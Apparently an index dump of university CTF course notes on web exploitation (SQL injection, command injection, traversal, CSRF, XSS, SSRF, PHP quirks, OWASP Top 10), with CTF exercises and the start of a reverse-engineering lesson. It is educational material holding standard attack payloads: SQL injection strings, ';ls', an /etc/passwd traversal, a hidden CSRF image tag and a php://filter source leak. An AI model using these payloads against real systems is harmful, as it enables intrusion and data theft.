send an email with a hyperlink to be clicked on or they can include an image tag of 0 by 0 pixels which will automatically be requested by the browser such as: <img src=\"http://securibank.com/transfer.do?acct=[RECEPIENT]&amount=[DOLLARS]\" width=\"0\" height=\"0\" border=\"0\"> Cross Site Scripting (XSS) Cross Site Scripting or XSS is a vulnerability where on user of an application can send JavaScript that is executed by the browser of another user of the same application. This is a vulnerability because JavaScript has a high degree of control over a user's web browser. For example JavaScript has the ability to: Modify the page (called the DOM) Send more HTTP requests Access cookies By combining all of these abilities, XSS can maliciously use JavaScript to extract user's cookies and send them to an attacker controlled server. XSS can also modify the DOM to phish users for their passwords. This only scratches the surface of what XSS can be used to do. XSS is typically broken down into three categories: Reflected XSS Stored XSS DOM XSS Reflected XSS Reflected XSS is when an XSS exploit is provided through a URL paramater. For example: https://ctf101.org?data=<script>alert(1)</script> You can see the XSS exploit provided in the data GET parameter. If the application is vulnerable to reflected XSS, the application will take this data parameter value and inject it into the DOM. For example: <html> <body> <script>alert(1)</script> </body> </html> Depending on where the exploit gets injected, it may need to be constructed differently. Also, the exploit payload can change to fit whatever the attacker needs it to do. Whether that is to extract cookies and submit it to an external server, or to simply modify the page to deface it. One of the deficiencies of reflected XSS however is that it requires the victim to access the vulnerable page from an attacker controlled resource. Notice that if the data paramter, wasn't provided the exploit wouldn't work. In many situations, reflected XSS is detected by the browser because it is very simple for a browser to detect malicous XSS payloads in URLs. Stored XSS Stored XSS is different from reflected XSS in one key way. In reflected XSS, the exploit is provided through a GET parameter. But in stored XSS, the exploit is provided from the website itself. Imagine a website that allows users to post comments. If a user can submit an XSS payload as a comment, and then have others view that malicious comment, it would be an example of stored XSS. The reason being that the web site itself is serving up the XSS payload to other users. This makes it very difficult to detect from the browser's perspective and no browser is capable of generically preventing stored XSS from exploiting a user. DOM XSS DOM XSS is XSS that is due to the browser itself injecting an XSS payload into the DOM. While the server itself may properly prevent XSS, it's possible that the client side scripts may accidentally take a payload and insert it into the DOM and cause the payload to trigger. The server itself is not to blame, but the client side JavaScript files are causing the issue. Server Side Request Forgery (SSRF) Server Side Request Forgery or SSRF is where an attacker is able to cause a web application to send a request that the attacker defines. For example, say there is a website that lets you take a screenshot of any site on the internet. Under normal usage a user might ask it to take a screenshot of a page like Google, or The New York Times. But what if a user does something more nefarious? What if they asked the site to take a picture of http://localhost ? Or perhaps tries to access something more useful like http://localhost/server-status ? 127.0.0.1 (also known as localhost or loopback) represents the computer itself. Accessing localhost means you are accessing the computer's own internal network. Developers often use localhost as a way to access the services they have running on their own computers. Depending on what the response from the site is the attacker may be able to gain additional information about what's running on the computer itself. In addition, the requests originating from the server would come from the server's IP not the attackers IP. Because of that, it is possible that the attacker might be able to access internal resources that he wouldn't normally be able to access. Another usage for SSRF is to create a simple port scanner to scan the internal network looking for internal services. PHP PHP is one of the most used languages for back-end web development and therefore it has become a target by hackers. PHP is a language which makes it painful to be secure for most instances, making it every hacker's dream target. Overview PHP is a C-like language which uses tags enclosed by <?php ... ?> (sometimes just <? ... ?> ). It is inlined into HTML. A word of advice is to keep the php docs open because function names are strange due to the fact that the length of function name is used to be the key in PHP's internal dictionary, so function names were shortened/lengthened to make the lookup faster. Other things include: Variables start with $: $name Variable variables: $$name Request-specific dictionaries: $_GET, $_POST, $_SERVER Example <?php if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['email']) && isset($_POST['password'])) { $db = new mysqli('127.0.0.1', 'cs3284', 'cs3284', 'logmein'); $email = $_POST['email']; $password = sha1($_POST['password']); $res = $db->query(\"SELECT * FROM users WHERE email = '$email' AND password = '$password'\"); if ($row = $res->fetch_assoc()) { $_SESSION['id'] = $row['id']; header('Location: index.php'); die(); } } ?> <html>... This example PHP simply checks the POST data for an email and password. If the password is equal to the hashed password in the database, the use is logged in and redirected to the index page. The line email = '$email' uses automatic string interpolation in order to convert $email into a string to compare with the database. Type Juggling PHP will do just about anything to match with a loose comparison (==) which means things can be 'equal' (==) or really equal (===). The implicit integer parsing to strings is the root cause of a lot of issues in PHP. Type Comparison Table Comparisons of $x with PHP Functions Expression gettype() empty() is_null() isset() boolean: if($x) $x = \"\"; string TRUE FALSE TRUE FALSE $x = null; NULL TRUE TRUE FALSE FALSE var $x; NULL TRUE TRUE FALSE FALSE $x is undefined NULL TRUE TRUE FALSE FALSE $x = array(); array TRUE FALSE TRUE FALSE $x = array('a', 'b'); array FALSE FALSE TRUE TRUE $x = false; boolean TRUE FALSE TRUE FALSE $x = true; boolean FALSE FALSE TRUE TRUE $x = 1; integer FALSE FALSE TRUE TRUE $x = 42; integer FALSE FALSE TRUE TRUE $x = 0; integer TRUE FALSE TRUE FALSE $x = -1; integer FALSE FALSE TRUE TRUE $x = \"1\"; string FALSE FALSE TRUE TRUE $x = \"0\"; string TRUE FALSE TRUE FALSE $x = \"-1\"; string FALSE FALSE TRUE TRUE $x = \"php\"; string FALSE FALSE TRUE TRUE $x = \"true\"; string FALSE FALSE TRUE TRUE $x = \"false\"; string FALSE FALSE TRUE TRUE \"==\" Comparisons TRUE FALSE 1 0 -1 \"1\" \"0\" \"-1\" NULL array() \"phparray() FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE TRUE TRUE FALSE FALSE \"php\" TRUE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE \"\" FALSE TRUE FALSE TRUE FALSE FALSE FALSE FALSE TRUE FALSE FALSE TRUE \"===\" Comparisons TRUE FALSE 1 0 -1 \"1\" \"0\" \"-1\" NULL array() \"phparray() FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE FALSE \"php\" FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE \"\" FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE TRUE File Inclusion PHP has multiple ways to include other source files such as require, require_once and include. These can take a dynamic string such as require $_GET['page'] . \".php\"; which is usually seen in templating. PHP Stream Filters PHP has its own URL scheme: php://... and its main purpose is to filter output automatically. It can automatically remove certain HTML tags and can base64 encode as well. Example $fp = fopen('php://output', 'w'); stream_filter_append( $fp, 'string.strip_tags', STREAM_FILTER_WRITE, array('b','i','u')); fwrite($fp, \"<b>bolded text</b> enlarged to a <h1>level 1 heading</h1>\\n\"); /* <b>bolded text</b> enlarged to a level 1 heading */ Exploitation These filters can also be used on input such as: php://filter/convert.base64-encode/resource={file} include , file_get_contents() , etc. support URLs including PHP stream filter URLs ( php:// ) include normally evaluates any PHP code (in tags) it finds, but if it\u2019s base64 encoded it can be used to leak source OWASP Top 10 There are three new categories, four categories with naming and scoping changes, and some consolidation in the Top 10 for 2021. A01:2021-Broken Access Control moves up from the fifth position; 94% of applications were tested for some form of broken access control. The 34 Common Weakness Enumerations (CWEs) mapped to Broken Access Control had more occurrences in applications than any other category. A02:2021-Cryptographic Failures shifts up one position to #2, previously known as Sensitive Data Exposure, which was broad symptom rather than a root cause. The renewed focus here is on failures related to cryptography which often leads to sensitive data exposure or system compromise. A03:2021-Injection slides down to the third position. 94% of the applications were tested for some form of injection, and the 33 CWEs mapped into this category have the second most occurrences in applications. Cross-site Scripting is now part of this category in this edition. A04:2021-Insecure Design is a new category for 2021, with a focus on risks related to design flaws. If we genuinely want to \u201cmove left\u201d as an industry, it calls for more use of threat modeling, secure design patterns and principles, and reference architectures. A05:2021-Security Misconfiguration moves up from #6 in the previous edition; 90% of applications were tested for some form of misconfiguration. With more shifts into highly configurable software, it\u2019s not surprising to see this category move up. The former category for XML External Entities (XXE) is now part of this category. A06:2021-Vulnerable and Outdated Components was previously titled Using Components with Known Vulnerabilities and is #2 in the Top 10 community survey, but also had enough data to make the Top 10 via data analysis. This category moves up from #9 in 2017 and is a known issue that we struggle to test and assess risk. It is the only category not to have any Common Vulnerability and Exposures (CVEs) mapped to the included CWEs, so a default exploit and impact weights of 5.0 are factored into their scores. A07:2021-Identification and Authentication Failures was previously Broken Authentication and is sliding down from the second position, and now includes CWEs that are more related to identification failures. This category is still an integral part of the Top 10, but the increased availability of standardized frameworks seems to be helping. A08:2021-Software and Data Integrity Failures is a new category for 2021, focusing on making assumptions related to software updates, critical data, and CI/CD pipelines without verifying integrity. One of the highest weighted impacts from Common Vulnerability and Exposures/Common Vulnerability Scoring System (CVE/CVSS) data mapped to the 10 CWEs in this category. Insecure Deserialization from 2017 is now a part of this larger category. A09:2021-Security Logging and Monitoring Failures was previously Insufficient Logging & Monitoring and is added from the industry survey (#3), moving up from #10 previously. This category is expanded to include more types of failures, is challenging to test for, and isn\u2019t well represented in the CVE/CVSS data. However, failures in this category can directly impact visibility, incident alerting, and forensics. A10:2021-Server-Side Request Forgery is added from the Top 10 community survey (#1). The data shows a relatively low incidence rate with above average testing coverage, along with above-average ratings for Exploit and Impact potential. This category represents the scenario where the security community members are telling us this is important, even though it\u2019s not illustrated in the data at this time. Exercise (5 pt) Jiaran!!! One of my friends loves Jiaran so, so much. I'm not so interested in Vtubers, but I do know vtubers would hide some flag in web. Now we have the chat page of fans: http://103.102.44.218:10003/ . Maybe you can find flag in this website. Hint: as a fan web, the privilege check is broken. source.zip (5 pt) Do you like pickle? Rick is a famous scientist in our universe. One time he trapped himself into a pickle. Find some items to save Rick. http://103.102.44.218:10004/ If you want to find some hints from source, here it is: source.zip (BONUS 5 pt) Jason is a cool guy Seems this website is impossible to broken. But still, nothing can block you hackers from stealing the flag. https://81.68.223.245/ Here's the source code for you: source.zip","title":"Week5 WEB: Vulnerability Exploit"},{"location":"CS315/Week%205/#week5-web-vulnerability-exploit","text":"","title":"Week5 WEB: Vulnerability Exploit"},{"location":"CS315/Week%205/#web-exploitation","text":"Websites all around the world are programmed using various programming languages. While there are specific vulnerabilities in each programming language that the developer should be aware of, there are issues fundamental to the internet that can show up regardless of the chosen language or framework. These vulnerabilities often show up in CTFs as web security challenges where the user needs to exploit a bug to gain some kind of higher level privilege. Common vulnerabilities to see in CTF challenges: SQL Injection Command Injection Directory Traversal Cross Site Request Forgery Cross Site Scripting Server Side Request Forgery","title":"Web Exploitation"},{"location":"CS315/Week%205/#sql-injection","text":"SQL Injection is a vulnerability where an application takes input from a user and doesn't validate that the user's input doesn't contain additional SQL. <?php $username = $_GET['username']; // kchung $result = mysql_query(\"SELECT * FROM users WHERE username='$username'\"); ?> If we look at the $username variable, under normal operation we might expect the username parameter to be a real username (e.g. kchung). But a malicious user might submit different kind of data. For example, consider if the input was ' ? The application would crash because the resulting SQL query is incorrect. SELECT * FROM users WHERE username=''' Notice the extra single quote at the end. With the knowledge that a single quote will cause an error in the application we can expand a little more on SQL Injection. What if our input was ' OR 1=1 ? SELECT * FROM users WHERE username='' OR 1=1 1 is indeed equal to 1. This equates to true in SQL. If we reinterpret this the SQL statement is really saying SELECT * FROM users WHERE username='' OR true This will return every row in the table because each row that exists must be true. We can also inject comments and termination characters like -- or /* or ; . This allows you to terminate SQL queries after your injected statements. For example '-- is a common SQL injection payload. SELECT * FROM users WHERE username=''-- ' This payload sets the username parameter to an empty string to break out of the query and then adds a comment ( -- ) that effectively hides the second single quote. Using this technique of adding SQL statements to an existing query we can force databases to return data that it was not meant to return.","title":"SQL Injection"},{"location":"CS315/Week%205/#command-injection","text":"Command Injection is a vulnerability that allows an attacker to submit system commands to a computer running a website. This happens when the application fails to encode user input that goes into a system shell. It is very common to see this vulnerability when a developer uses the system() command or its equivalent in the programming language of the application. import os domain = user_input() # ctf101.org os.system('ping ' + domain) The above code when used normally will ping the ctf101.org domain. But consider what would happen if the user_input() function returned different data? import os domain = user_input() # ; ls os.system('ping ' + domain) Because of the additional semicolon, the os.system() function is instructed to run two commands. It looks to the program as: ping ; ls The semicolon terminates a command in bash and allows you to put another command after it. Because the ping command is being terminated and the ls command is being added on, the ls command will be run in addition to the empty ping command! This is the core concept behind command injection. The ls command could of course be switched with another command (e.g. wget, curl, bash, etc.) Command injection is a very common means of privelege escalation within web applications and applications that interface with system commands. Many kinds of home routers take user input and directly append it to a system command. For this reason, many of those home router models are vulnerable to command injection.","title":"Command Injection"},{"location":"CS315/Week%205/#example-payloads","text":";ls $(ls) ls","title":"Example Payloads"},{"location":"CS315/Week%205/#directory-traversal","text":"Directory Traversal is a vulnerability where an application takes in user input and uses it in a directory path. Any kind of path controlled by user input that isn't properly sanitized or properly sandboxed could be vulnerable to directory traversal. For example, consider an application that allows the user to choose what page to load from a GET parameter. <?php $page = $_GET['page']; // index.php include(\"/var/www/html/\" . $page); ?> Under normal operation the page would be index.php . But what if a malicious user gave in something different? <?php $page = $_GET['page']; // ../../../../../../../../etc/passwd include(\"/var/www/html/\" . $page); ?> Here the user is submitting ../../../../../../../../etc/passwd . This will result in the PHP interpreter leaving the directory that it is coded to look in ('/var/www/html') and instead be forced up to the root folder. include(\"/var/www/html/../../../../../../../../etc/passwd\"); Ultimately this will become /etc/passwd because the computer will not go a directory above its top directory. Thus the application will load the /etc/passwd file and emit it to the user like so: root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false _apt:x:104:65534::/nonexistent:/bin/false This same concept can be applied to applications where some input is taken from a user and then used to access a file or path or similar. This vulnerability very often can be used to leak sensitive data or extract application source code to find other vulnerabilities.","title":"Directory Traversal"},{"location":"CS315/Week%205/#cross-site-request-forgery-csrf","text":"A Cross Site Request Forgery or CSRF Attack, pronounced see surf , is an attack on an authenticated user which uses a state session in order to perform state changing attacks like a purchase, a transfer of funds, or a change of email address. The entire premise of CSRF is based on session hijacking, usually by injecting malicious elements within a webpage through an <img> tag or an <iframe> where references to external resources are unverified.","title":"Cross Site Request Forgery (CSRF)"},{"location":"CS315/Week%205/#using-csrf","text":"GET requests are often used by websites to get user input. Say a user signs in to an banking site which assigns their browser a cookie which keeps them logged in. If they transfer some money, the URL that is sent to the server might have the pattern: http://securibank.com/transfer.do?acct=[RECEPIENT]&amount=[DOLLARS] Knowing this format, an attacker can send an email with a hyperlink to be clicked on or they can include an image tag of 0 by 0 pixels which will automatically be requested by the browser such as: <img src=\"http://securibank.com/transfer.do?acct=[RECEPIENT]&amount=[DOLLARS]\" width=\"0\" height=\"0\" border=\"0\">","title":"Using CSRF"},{"location":"CS315/Week%205/#cross-site-scripting-xss","text":"Cross Site Scripting or XSS is a vulnerability where on user of an application can send JavaScript that is executed by the browser of another user of the same application. This is a vulnerability because JavaScript has a high degree of control over a user's web browser. For example JavaScript has the ability to: Modify the page (called the DOM) Send more HTTP requests Access cookies By combining all of these abilities, XSS can maliciously use JavaScript to extract user's cookies and send them to an attacker controlled server. XSS can also modify the DOM to phish users for their passwords. This only scratches the surface of what XSS can be used to do. XSS is typically broken down into three categories: Reflected XSS Stored XSS DOM XSS","title":"Cross Site Scripting (XSS)"},{"location":"CS315/Week%205/#reflected-xss","text":"Reflected XSS is when an XSS exploit is provided through a URL paramater. For example: https://ctf101.org?data=<script>alert(1)</script> You can see the XSS exploit provided in the data GET parameter. If the application is vulnerable to reflected XSS, the application will take this data parameter value and inject it into the DOM. For example: <html> <body> <script>alert(1)</script> </body> </html> Depending on where the exploit gets injected, it may need to be constructed differently. Also, the exploit payload can change to fit whatever the attacker needs it to do. Whether that is to extract cookies and submit it to an external server, or to simply modify the page to deface it. One of the deficiencies of reflected XSS however is that it requires the victim to access the vulnerable page from an attacker controlled resource. Notice that if the data paramter, wasn't provided the exploit wouldn't work. In many situations, reflected XSS is detected by the browser because it is very simple for a browser to detect malicous XSS payloads in URLs.","title":"Reflected XSS"},{"location":"CS315/Week%205/#stored-xss","text":"Stored XSS is different from reflected XSS in one key way. In reflected XSS, the exploit is provided through a GET parameter. But in stored XSS, the exploit is provided from the website itself. Imagine a website that allows users to post comments. If a user can submit an XSS payload as a comment, and then have others view that malicious comment, it would be an example of stored XSS. The reason being that the web site itself is serving up the XSS payload to other users. This makes it very difficult to detect from the browser's perspective and no browser is capable of generically preventing stored XSS from exploiting a user.","title":"Stored XSS"},{"location":"CS315/Week%205/#dom-xss","text":"DOM XSS is XSS that is due to the browser itself injecting an XSS payload into the DOM. While the server itself may properly prevent XSS, it's possible that the client side scripts may accidentally take a payload and insert it into the DOM and cause the payload to trigger. The server itself is not to blame, but the client side JavaScript files are causing the issue.","title":"DOM XSS"},{"location":"CS315/Week%205/#server-side-request-forgery-ssrf","text":"Server Side Request Forgery or SSRF is where an attacker is able to cause a web application to send a request that the attacker defines. For example, say there is a website that lets you take a screenshot of any site on the internet. Under normal usage a user might ask it to take a screenshot of a page like Google, or The New York Times. But what if a user does something more nefarious? What if they asked the site to take a picture of http://localhost ? Or perhaps tries to access something more useful like http://localhost/server-status ? 127.0.0.1 (also known as localhost or loopback) represents the computer itself. Accessing localhost means you are accessing the computer's own internal network. Developers often use localhost as a way to access the services they have running on their own computers. Depending on what the response from the site is the attacker may be able to gain additional information about what's running on the computer itself. In addition, the requests originating from the server would come from the server's IP not the attackers IP. Because of that, it is possible that the attacker might be able to access internal resources that he wouldn't normally be able to access. Another usage for SSRF is to create a simple port scanner to scan the internal network looking for internal services.","title":"Server Side Request Forgery (SSRF)"},{"location":"CS315/Week%205/#php","text":"PHP is one of the most used languages for back-end web development and therefore it has become a target by hackers. PHP is a language which makes it painful to be secure for most instances, making it every hacker's dream target.","title":"PHP"},{"location":"CS315/Week%205/#overview","text":"PHP is a C-like language which uses tags enclosed by <?php ... ?> (sometimes just <? ... ?> ). It is inlined into HTML. A word of advice is to keep the php docs open because function names are strange due to the fact that the length of function name is used to be the key in PHP's internal dictionary, so function names were shortened/lengthened to make the lookup faster. Other things include: Variables start with $: $name Variable variables: $$name Request-specific dictionaries: $_GET, $_POST, $_SERVER","title":"Overview"},{"location":"CS315/Week%205/#example","text":"<?php if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['email']) && isset($_POST['password'])) { $db = new mysqli('127.0.0.1', 'cs3284', 'cs3284', 'logmein'); $email = $_POST['email']; $password = sha1($_POST['password']); $res = $db->query(\"SELECT * FROM users WHERE email = '$email' AND password = '$password'\"); if ($row = $res->fetch_assoc()) { $_SESSION['id'] = $row['id']; header('Location: index.php'); die(); } } ?> <html>... This example PHP simply checks the POST data for an email and password. If the password is equal to the hashed password in the database, the use is logged in and redirected to the index page. The line email = '$email' uses automatic string interpolation in order to convert $email into a string to compare with the database.","title":"Example"},{"location":"CS315/Week%205/#type-juggling","text":"PHP will do just about anything to match with a loose comparison (==) which means things can be 'equal' (==) or really equal (===). The implicit integer parsing to strings is the root cause of a lot of issues in PHP.","title":"Type Juggling"},{"location":"CS315/Week%205/#type-comparison-table","text":"","title":"Type Comparison Table"},{"location":"CS315/Week%205/#comparisons-of-x-with-php-functions","text":"Expression gettype() empty() is_null() isset() boolean: if($x) $x = \"\"; string TRUE FALSE TRUE FALSE $x = null; NULL TRUE TRUE FALSE FALSE var $x; NULL TRUE TRUE FALSE FALSE $x is undefined NULL TRUE TRUE FALSE FALSE $x = array(); array TRUE FALSE TRUE FALSE $x = array('a', 'b'); array FALSE FALSE TRUE TRUE $x = false; boolean TRUE FALSE TRUE FALSE $x = true; boolean FALSE FALSE TRUE TRUE $x = 1; integer FALSE FALSE TRUE TRUE $x = 42; integer FALSE FALSE TRUE TRUE $x = 0; integer TRUE FALSE TRUE FALSE $x = -1; integer FALSE FALSE TRUE TRUE $x = \"1\"; string FALSE FALSE TRUE TRUE $x = \"0\"; string TRUE FALSE TRUE FALSE $x = \"-1\"; string FALSE FALSE TRUE TRUE $x = \"php\"; string FALSE FALSE TRUE TRUE $x = \"true\"; string FALSE FALSE TRUE TRUE $x = \"false\"; string FALSE FALSE TRUE TRUE","title":"Comparisons of $x with PHP Functions"},{"location":"CS315/Week%205/#comparisons","text":"TRUE FALSE 1 0 -1 \"1\" \"0\" \"-1\" NULL array() \"phparray() FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE TRUE TRUE FALSE FALSE \"php\" TRUE FALSE FALSE TRUE FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE \"\" FALSE TRUE FALSE TRUE FALSE FALSE FALSE FALSE TRUE FALSE FALSE TRUE","title":"\"==\" Comparisons"},{"location":"CS315/Week%205/#comparisons_1","text":"TRUE FALSE 1 0 -1 \"1\" \"0\" \"-1\" NULL array() \"phparray() FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE FALSE \"php\" FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE TRUE FALSE \"\" FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE FALSE TRUE","title":"\"===\" Comparisons"},{"location":"CS315/Week%205/#file-inclusion","text":"PHP has multiple ways to include other source files such as require, require_once and include. These can take a dynamic string such as require $_GET['page'] . \".php\"; which is usually seen in templating.","title":"File Inclusion"},{"location":"CS315/Week%205/#php-stream-filters","text":"PHP has its own URL scheme: php://... and its main purpose is to filter output automatically. It can automatically remove certain HTML tags and can base64 encode as well.","title":"PHP Stream Filters"},{"location":"CS315/Week%205/#example_1","text":"$fp = fopen('php://output', 'w'); stream_filter_append( $fp, 'string.strip_tags', STREAM_FILTER_WRITE, array('b','i','u')); fwrite($fp, \"<b>bolded text</b> enlarged to a <h1>level 1 heading</h1>\\n\"); /* <b>bolded text</b> enlarged to a level 1 heading */","title":"Example"},{"location":"CS315/Week%205/#exploitation","text":"These filters can also be used on input such as: php://filter/convert.base64-encode/resource={file} include , file_get_contents() , etc. support URLs including PHP stream filter URLs ( php:// ) include normally evaluates any PHP code (in tags) it finds, but if it\u2019s base64 encoded it can be used to leak source","title":"Exploitation"},{"location":"CS315/Week%205/#owasp-top-10","text":"There are three new categories, four categories with naming and scoping changes, and some consolidation in the Top 10 for 2021. A01:2021-Broken Access Control moves up from the fifth position; 94% of applications were tested for some form of broken access control. The 34 Common Weakness Enumerations (CWEs) mapped to Broken Access Control had more occurrences in applications than any other category. A02:2021-Cryptographic Failures shifts up one position to #2, previously known as Sensitive Data Exposure, which was broad symptom rather than a root cause. The renewed focus here is on failures related to cryptography which often leads to sensitive data exposure or system compromise. A03:2021-Injection slides down to the third position. 94% of the applications were tested for some form of injection, and the 33 CWEs mapped into this category have the second most occurrences in applications. Cross-site Scripting is now part of this category in this edition. A04:2021-Insecure Design is a new category for 2021, with a focus on risks related to design flaws. If we genuinely want to \u201cmove left\u201d as an industry, it calls for more use of threat modeling, secure design patterns and principles, and reference architectures. A05:2021-Security Misconfiguration moves up from #6 in the previous edition; 90% of applications were tested for some form of misconfiguration. With more shifts into highly configurable software, it\u2019s not surprising to see this category move up. The former category for XML External Entities (XXE) is now part of this category. A06:2021-Vulnerable and Outdated Components was previously titled Using Components with Known Vulnerabilities and is #2 in the Top 10 community survey, but also had enough data to make the Top 10 via data analysis. This category moves up from #9 in 2017 and is a known issue that we struggle to test and assess risk. It is the only category not to have any Common Vulnerability and Exposures (CVEs) mapped to the included CWEs, so a default exploit and impact weights of 5.0 are factored into their scores. A07:2021-Identification and Authentication Failures was previously Broken Authentication and is sliding down from the second position, and now includes CWEs that are more related to identification failures. This category is still an integral part of the Top 10, but the increased availability of standardized frameworks seems to be helping. A08:2021-Software and Data Integrity Failures is a new category for 2021, focusing on making assumptions related to software updates, critical data, and CI/CD pipelines without verifying integrity. One of the highest weighted impacts from Common Vulnerability and Exposures/Common Vulnerability Scoring System (CVE/CVSS) data mapped to the 10 CWEs in this category. Insecure Deserialization from 2017 is now a part of this larger category. A09:2021-Security Logging and Monitoring Failures was previously Insufficient Logging & Monitoring and is added from the industry survey (#3), moving up from #10 previously. This category is expanded to include more types of failures, is challenging to test for, and isn\u2019t well represented in the CVE/CVSS data. However, failures in this category can directly impact visibility, incident alerting, and forensics. A10:2021-Server-Side Request Forgery is added from the Top 10 community survey (#1). The data shows a relatively low incidence rate with above average testing coverage, along with above-average ratings for Exploit and Impact potential. This category represents the scenario where the security community members are telling us this is important, even though it\u2019s not illustrated in the data at this time.","title":"OWASP Top 10"},{"location":"CS315/Week%205/#exercise","text":"","title":"Exercise"},{"location":"CS315/Week%205/#5-pt-jiaran","text":"One of my friends loves Jiaran so, so much. I'm not so interested in Vtubers, but I do know vtubers would hide some flag in web. Now we have the chat page of fans: http://103.102.44.218:10003/ . Maybe you can find flag in this website. Hint: as a fan web, the privilege check is broken. source.zip","title":"(5 pt) Jiaran!!!"},{"location":"CS315/Week%205/#5-pt-do-you-like-pickle","text":"Rick is a famous scientist in our universe. One time he trapped himself into a pickle. Find some items to save Rick. http://103.102.44.218:10004/ If you want to find some hints from source, here it is: source.zip","title":"(5 pt) Do you like pickle?"},{"location":"CS315/Week%205/#bonus-5-pt-jason-is-a-cool-guy","text":"Seems this website is impossible to broken. But still, nothing can block you hackers from stealing the flag. https://81.68.223.245/ Here's the source code for you: source.zip","title":"(BONUS 5 pt) Jason is a cool guy"},{"location":"CS315/Week%206/","text":"Week6 RE: De-compiling Program Reverse Engineering Reverse Engineering in a CTF is typically the process of taking a compiled (machine code, bytecode) program and converting it back into a more human readable format. Very often the goal of a reverse engineering challenge is to understand the functionality of a given program such that you can identify deeper issues. Assembly / Machine Code The C Programming Language Disassemblers Decompilers Assembly/Machine Code Machine Code or Assembly is code which has been formatted for direct execution by a CPU. Machine Code is the why readable programming languages like C, when compiled, cannot be reversed into source code (well Decompilers can sort of, but more on that later). From Source to Compilation Godbolt shows the differences in machine code generated by various compilers. For example, if we have a simple C++ function: #include <unistd.h> #include <stdio.h> #include <stdlib.h> int main() { char c; int fd = syscall(2, \"/etc/passwd\", 0); while (syscall(0, fd, &c, 1)) { putchar(c); } } We can see the compilation results in some verbose instrucitons for the CPU: .LC0: .string \"/etc/passwd\" main: push rbp mov rbp, rsp sub rsp, 16 mov edx, 0 mov esi, OFFSET FLAT:.LC0 mov edi, 2 mov eax, 0 call syscall mov DWORD PTR [rbp-4], eax .L3: lea rdx, [rbp-5] mov eax, DWORD PTR [rbp-4] mov ecx, 1 mov esi, eax mov edi, 0 mov eax, 0 call syscall test rax, rax setne al test al, al je .L2 movzx eax, BYTE PTR [rbp-5] movsx eax, al mov edi, eax call putchar jmp .L3 .L2: mov eax, 0 leave ret This is a one way process for compiled languages as there is no way to generate source from machine code. While the machine code may seem unintelligble, the extremely basic functions can be interpreted with some practice. x86-64 x86-64 or amd64 or i64 is a 64-bit Complex Instruction Set Computing (CISC) architecture. This basically means that the registers used for this architecture extend an extra 32-bits on Intel's x86 architecture. CISC means that a single instruction can do a bunch of diferent things at once such as memory accesses, register reads, etc. It is also a variable-length instruction set which means diferent instructions can be diferent sizes ranging from 1 to 16 bytes long. And finally x86-64 allows for multi-sized register access which means that you can access certain parts of a register which are diferent sizes. x86-64 Registers x86-64 registers behave similarly to other architectures. A key component of x86-64 registers is multi-sized access which means the register RAX can have its lower 32 bits accessed with EAX. The next lower 16 bits can be accessed with AX and the lowest 8 bits can be accessed with AL which allows for the compuler to make optimizations which boost program execution. x86-64 has plenty of registers to use including rax, rbx, rcx, rdx, rdi, rsi, rsp, rip, r8-r15, and more! But some registers serve special purposes. The special registers include: - RIP: the instruction pointer - RSP: the stack pointer - RBP: the base pointer Instructions An instruction represents a single operation for the CPU to perform. There are diferent types of instructions including: Data movement: mov rax, [rsp - 0x40] Arithmetic: add rbx, rcx Control-flow: jne 0x8000400 Because x86-64 is a CISC architecture, instructions can be quite complex for machine code such as repne scasb which repeats up to ECX times over memory at EDI looking for NULL byte (0x00), decrementing ECX each byte (Essentially strlen() in a single instruction!) It is important to remember that an instruction really is just memory, this idea will become useful with Return Oriented Programming or ROP. Note Instructions, numbers, strings, everything! Always represented in hex. add rax, rbx mov rax, 0xdeadbeef mov rax, [0xdeadbeef] == 67 48 8b 05 ef be ad de \"Hello\" == 48 65 6c 6c 6f == 48 01 d8 == 48 c7 c0 ef be ad de Execution What should the CPU execute? This is determined by the RIP register where IP means instruction pointer. Execution follows the pattern: fetch the instruction at the address in RIP, decode it, run it. Examples mov rax, 0xdeadbeef Here the operation mov is moving the \"immeadiate\" 0xdeadbeef into the register RAX mov rax, [0xdeadbeef + rbx * 4] Here the operation mov is moving the data at the address of [0xdeadbeef + RBX*4] into the register RAX . When brackets are used, you can think of the program as getting the content from that effective address. Example Execution -> 0x0804000: mov eax, 0xdeadbeef Register Values: 0x0804005: mov ebx, 0x1234 RIP = 0x0804000 0x080400a: add, rax, rbx RAX = 0x0 0x080400d: inc rbx RBX = 0x0 0x0804010: sub rax, rbx RCX = 